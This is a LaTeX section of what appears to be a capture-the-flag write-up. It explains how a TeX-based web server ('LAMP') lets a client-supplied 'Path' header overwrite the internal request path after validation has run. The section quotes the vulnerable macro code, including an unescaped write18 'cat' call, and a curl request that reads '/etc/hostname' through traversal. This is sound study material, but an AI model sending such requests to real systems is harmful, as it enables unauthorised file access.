% ============================================================
% 03 -- PATH HEADER OVERWRITE
% ============================================================

\section{Path Header Overwrite}
\label{sec:path-header}

The first useful primitive came from a surprisingly small naming
collision.

LAMP parsed the requested path from the HTTP request line and stored it
inside the TeX macro \code{\textbackslash httpPath}.

The relevant code was:

\begin{lstlisting}
\newcommand{\httpParseLine}{
  \readln{\httpLine}
  \StrCut[1]{\httpLine}{ }{\httpMethod}{\httpLine}
  \StrCut[1]{\httpLine}{ }{\httpPath}{\httpVersion}
  \StrCut[1]{\httpPath}{?}{\httpPath}{\httpQuery}

  \xdef\httpMethod#1{\httpMethod}
  \xdef\httpPath#1{\httpPath}
  \xdef\httpVersion#1{\httpVersion}
}
\end{lstlisting}

So for a normal request such as:

\begin{lstlisting}
GET / HTTP/1.1
\end{lstlisting}

the application eventually ended up with roughly:

\begin{lstlisting}
\httpPath{} -> /
\end{lstlisting}

So far, nothing particularly exciting.


% ------------------------------------------------------------
% 3.1
% ------------------------------------------------------------

\subsection{Headers Became TeX Macros}

The interesting part appeared immediately afterwards.

LAMP parsed every HTTP header and dynamically created a TeX control
sequence from its name:

\begin{lstlisting}
\newcommand{\httpParseHeader}{
  \loop
  \readln{\header}

  \unless\ifx\header\empty{

      \StrCut[1]{\header}{:}{\name}{\value}

      ...

      \edef\name{\httpTransformHeaderName{\name}}

      \expandafter\xdef
        \csname http\name\endcsname
        #1{\value}

    }

  \repeat
}
\end{lstlisting}

For example:

\begin{lstlisting}
Cookie: Session=abc
\end{lstlisting}

created a macro named approximately:

\begin{lstlisting}
\httpCookie{}
\end{lstlisting}

This was intended as a convenient way of exposing request headers to the
rest of the application.

Unfortunately, header names shared the same namespace as LAMP's internal
request state.


% ------------------------------------------------------------
% 3.2
% ------------------------------------------------------------

\subsection{The Collision}

One internal variable was already named:

\begin{lstlisting}
\httpPath
\end{lstlisting}

The corresponding HTTP header name was therefore fairly obvious:

\begin{lstlisting}
Path:
\end{lstlisting}

After LAMP transformed the header name and constructed the dynamic macro,
the following header:

\begin{lstlisting}
Path: /something
\end{lstlisting}

created:

\begin{lstlisting}
\httpPath{} -> /something
\end{lstlisting}

That replaced the path originally parsed from the request line.

\begin{findingbox}
The request path and HTTP headers were stored in the same dynamically
constructed TeX namespace.

As a result, a client-controlled \code{Path} header could overwrite the
internal \code{\textbackslash httpPath} variable.
\end{findingbox}


% ------------------------------------------------------------
% 3.3
% ------------------------------------------------------------

\subsection{Why Validation Did Not Save It}

This became particularly useful because path validation happened before
the malicious header replaced the path.

Conceptually, the request flow looked like this:

\begin{lstlisting}
GET / HTTP/1.1

        |
        v

validate "/"

        |
        v

Path: /../../etc/hostname

        |
        v

\httpPath = /../../etc/hostname
\end{lstlisting}

The request itself therefore used a completely legitimate route:

\begin{lstlisting}
GET /
\end{lstlisting}

Only afterwards did the \code{Path} header replace the value used by the
TeX application.

The validation applied to one value.

The application later consumed another.


% ------------------------------------------------------------
% 3.4
% ------------------------------------------------------------

\subsection{Turning It Into a File Read}

The static-file handler constructed paths using:

\begin{lstlisting}
\httpStatic\httpPath{}
\end{lstlisting}

where the static root was configured as:

\begin{lstlisting}
/srv/www/
\end{lstlisting}

With a traversal value in \code{\textbackslash httpPath}, this could
resolve outside the intended static directory.

The file-serving code then used the resulting path directly:

\begin{lstlisting}
\immediate\write18{
  cat "`cat path.tex`"
}
\end{lstlisting}

A minimal request therefore became:

\begin{lstlisting}
curl -g -6 --noproxy '*' \
  --path-as-is \
  -H 'Path: /../../etc/hostname' \
  'http://[TARGET]:1337/'
\end{lstlisting}

The request line still targeted the valid route \code{/}.

The \code{Path} header then replaced the internal path after parsing and
allowed the service to return files outside the intended web root.


% ------------------------------------------------------------
% 3.5
% ------------------------------------------------------------

\subsection{What This Gave Us}

At this point, the primitive was already useful:

\begin{center}
  \displayfont\large\bfseries
  attacker-controlled file retrieval inside the LAMP container
\end{center}

It could be used to retrieve files reachable by the service process,
including files created later during exploitation.

That last detail became especially important.

Once we found a way to execute a shell command and redirect its output
into a file, the same \code{Path} header bug gave us a convenient way to
retrieve the result over HTTP.

The exploit chain therefore gained its first reusable building block:

\begin{center}
  \displayfont
  \code{Path:}
  $\longrightarrow$
  overwrite \code{\textbackslash httpPath}
  $\longrightarrow$
  traverse filesystem
  $\longrightarrow$
  retrieve file
\end{center}

The next step was finding something more powerful than a file read:

\begin{center}
  \displayfont\large\bfseries
  making stored database content become executable TeX.
\end{center}